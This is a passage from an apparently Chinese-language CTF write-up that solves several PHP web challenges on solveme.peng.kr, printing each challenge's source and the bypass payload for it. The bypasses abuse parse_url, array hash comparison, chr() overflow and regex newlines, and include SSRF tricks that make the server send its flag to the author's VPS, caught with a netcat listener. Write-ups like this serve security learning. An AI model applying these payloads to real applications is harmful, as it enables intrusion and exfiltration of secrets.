filtering"></a>URL filtering</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">   $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">   <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">       <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">           $key = $param;</span><br><span class="line">           $value = <span class="string">""</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">           $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ä¸ªé¢˜ç›®æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨parse_urlå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸ªæ¼æ´å¯ä»¥ç”¨å¤šä¸ª/ç¬¦å·å»ç»•è¿‡ï¼Œç„¶åå°±ä¸ä¼šæ‰§è¡Œ<code>die(&quot;no hack&quot;)</code>;è½¬è€Œæ‰§è¡Œäº†ä¸‹é¢çš„è¯­å¥ã€‚<br>è¿™é‡Œæœ‰ç¯‡æ–¹æ–¹åœŸå­¦é•¿å†™è¿‡çš„æ€»ç»“:<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">ç‚¹æˆ‘</a><br>æ„é€ çš„<code>payloadï¼š///?do_you_want_flag=yes</code><br>åæ¥å‘ç°è¿˜æœ‰å®˜æ–¹çš„è§£æ³•ï¼Œå°±æ˜¯åˆ©ç”¨æç‚¹å»ç»•è¿‡ï¼Œä»æ¥éƒ½ä¸çŸ¥é“è¿˜å¯ä»¥è¿™æ ·æ<br><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes</code></p><p>#Hash collision</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™ç§é¢˜ç›®åšäº†å¾ˆå¤šéäº†ï¼Œå°±æ˜¯åˆ©ç”¨æ•°ç»„è¿”å›NULLå»ç»•è¿‡ï¼Œæ„é€ ä¸‹é¢çš„payload</p><p><code>?foo[]=1&amp;bar[]=2</code></p><h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°è¦è·Ÿ<code>./secret.passwd</code>è·¯å¾„ä¸‹çš„å†…å®¹ä¸€æ ·ï¼Œå…ˆå»é‡Œé¢çœ‹ä¸€ä¸‹ï¼Œå‘ç°å­—ç¬¦ä¸²<code>simple_passw0rd</code><br>è¿™ä¸ªé¢˜ç›®getåˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹</p><p>å°±æ˜¯chr()è¿™ä¸ªå‡½æ•°å†ASCIIç è¶…è¿‡255çš„æ—¶å€™ä¼šè‡ªåŠ¨å–ä½™ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å»æ‹¼æ¥usernameçš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯å†™äº†ä¸ªPythonè„šæœ¬æ„é€ payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'''15th_HackingCamp'''</span></span><br><span class="line">dit = []</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">dit.append((ord(i)+<span class="number">256</span>))</span><br><span class="line"><span class="comment">#print dit </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dit:</span><br><span class="line">payload += (<span class="string">'value[]='</span>+str(j)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload+<span class="string">'password=simple_passw0rd'</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag</p><h3 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™é¢˜é¢˜ç›®æ¼æ´å‡ºç°åœ¨æ­£åˆ™åŒ¹é…é‚£é‡Œ<br>æ ¹æ®æˆ‘ä»¬æŸ¥åˆ°çš„èµ„æ–™ï¼Œå› ä¸ºä»¥â€™^â€™å¼€å¤´ï¼Œä»¥â€™$â€™ç»“å°¾çš„åªèƒ½åŒ¹é…ä¸€è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨<code>%0a</code>/urlç¼–ç ä¸‹çš„æ¢è¡Œ/å»ç»•è¿‡<br>äºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ payload:?say=<code>%0Agive_me_the_flag</code><br>å¾—åˆ°flag</p><h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        <span class="keyword">if</span>($socket === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to create socket'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[<span class="string">'host'</span>]);</span><br><span class="line">        $port = is_null($parse[<span class="string">'port'</span>]) ? <span class="number">80</span> : $parse[<span class="string">'port'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socket_connect($socket, $host, $port) === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to connect'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = <span class="string">"HEAD /"</span>.$flag.<span class="string">" HTTP/1.1\r\n"</span>.</span><br><span class="line">            <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>.</span><br><span class="line">            <span class="string">"Connection: Close\r\n"</span>.</span><br><span class="line">            <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, <span class="number">1024</span>);var_dump($recv);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^HTTP\/1.1 200 OK\r\n/'</span>, $recv))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed response'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è·Ÿä¸Šé¢ä¸€é¢˜ç±»ä¼¼ï¼Œåªæ˜¯å¯¹äºhostæœ‰äº†è¿‡æ»¤ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ <code>ip2long()</code> å‡½æ•°å°†ç½‘ç»œåœ°å€è½¬åŒ–ä¸ºæ•°å­—åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡.çš„ipè¿‡æ»¤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ip2long(<span class="string">"120.78.164.84"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Payload ï¼š<br><code>givemealink2.solveme.peng.kr?url=http://2018419796:8080/plz%1agive%1ame</code><br>ç„¶ååœ¨æœåŠ¡å™¨ä¸Šé¢å¼€ç›‘å¬</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥æ¥æ”¶åˆ°è¿”å›çš„flag</p><h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°è¿™æ®µä»£ç çš„é€»è¾‘æ˜¯ç”¨getæ–¹æ³•æ¥å—ä¸€ä¸ªå‚æ•°urlï¼Œè€Œè¿™ä¸ªå‚æ•°è¦ç»è¿‡ä¸‰æ¬¡çš„æ£€æµ‹ï¼Œç¬¬ä¸€æ¬¡ä¼šæŠŠå«æœ‰ä¸‹åˆ’çº¿ï¼Œç©ºç™½å­—ç¬¦è¿‡æ»¤æ‰ï¼Œç¬¬äºŒæ¬¡è¿‡æ»¤æ£€éªŒçš„æ˜¯æ˜¯å¦æ»¡è¶³urlçš„æ ¼å¼ï¼Œè€Œä¸”å¿…é¡»å«æœ‰<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>é‡Œé¢çš„å†…å®¹ä¹Ÿå°±æ˜¯<code>http://givemealink.solveme.peng.kr/</code>ï¼Œè€Œç¬¬ä¸‰æ¬¡åˆ™åˆ¤æ–­è·¯å¾„ä¸‹æ˜¯å¦å«æœ‰<code>plz_give_me</code>è¿™ä¸ªå­—æ®µï¼Œçªç„¶å‘ç°è¿™ä¸ªä¸œè¥¿è·Ÿç¬¬ä¸€ä¸ªè¿‡æ»¤ä¸‹åˆ’çº¿çš„è‡ªç›¸çŸ›ç›¾ï¼ŒæŸ¥ä¸€ä¸‹PHPæ–‡æ¡£ï¼Œé—®é¢˜å‡ºç°åœ¨parse_urlè¿™ä¸ªå‡½æ•°é‡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"></span><br><span class="line">    The URL to parse. Invalid characters are replaced by _.</span><br></pre></td></tr></table></figure><p>éæ³•å­—ç¬¦åœ¨è¿™ä¸ªå‡½æ•°ä¸‹ä¼šè‡ªåŠ¨æ›¿æ¢æˆä¸‹åˆ’çº¿ï¼Œæµ‹è¯•ä¸€ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = urldecode(<span class="string">"http://0verwatch.top/%1atest%1a.php"</span>);</span><br><span class="line">   var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"0verwatch.top"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"/_test_.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å‘ç°è¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æˆåŠŸç»•è¿‡ç¬¬ä¸€ä¸ªè¿‡æ»¤ï¼Œä»¥åŠæ»¡è¶³ç¬¬ä¸‰ä¸ªè¿‡æ»¤<br>è¿™æ—¶å€™è€ƒè™‘ç¬¬äºŒä¸ªè¿‡æ»¤ï¼Œç»§ç»­æŸ¥çœ‹parse_urlè¿™ä¸ªå‡½æ•°æ–‡æ¡£ä½ ä¼šå‘ç°ä»–æœ‰è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br></pre></td></tr></table></figure></p><p>è¿™ä¹Ÿæ˜¯urlçš„ä¸€ç§å†™æ³•ï¼Œç°åœ¨æ„Ÿè§‰å¾ˆå°‘ç”¨åœ¨httpæœåŠ¡ä¸Šæ„Ÿè§‰åœ¨sshè¿æ¥è‡ªå·±çš„æœåŠ¡å™¨ä¸Šé¢ç”¨çš„å¤šï¼Œå› ä¸ºä¸€èˆ¬çš„urléƒ½æ˜¯è¿™æ ·çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯å¹³å¸¸æˆ‘ä»¬è¿æ¥è‡ªå·±æœåŠ¡å™¨çš„æ—¶å€™å¯ä»¥è¿™æ ·<code>ssh root@vps_ip</code> ç„¶åè¾“å…¥å¯†ç ï¼Œè¿™åº”è¯¥ä¹Ÿæ˜¯è¿™ç§ç±»å‹çš„<br><a href="https://imgchr.com/i/P28fJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28fJO.md.png" alt="P28fJO.md.png"></a></p><p>ç„¶åè¿™é‡Œçš„è¯ç›¸å½“äºusernameè¿˜æœ‰passwordæ²¡æœ‰ä»»ä½•å®é™…ä½œç”¨ï¼Œçº¯ç²¹å°±æ˜¯ç”¨æ¥å†™é‚£ä¸ª$_SERVER[â€˜HTTP_HOSTâ€™]æ¥è¿›è¡Œç»•è¿‡çš„<br>payloadï¼š<code>http://givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr@vps_ip/plz%1agive%1ame</code><br>æˆ‘ä»¬å†æµ‹è¯•ä¸€ä¸‹ï¼Œç»“æœå®Œå…¨ç¬¦åˆæˆ‘ä»¬ç»•è¿‡çš„è¦æ±‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"120.78.164.84"</span></span><br><span class="line">  [<span 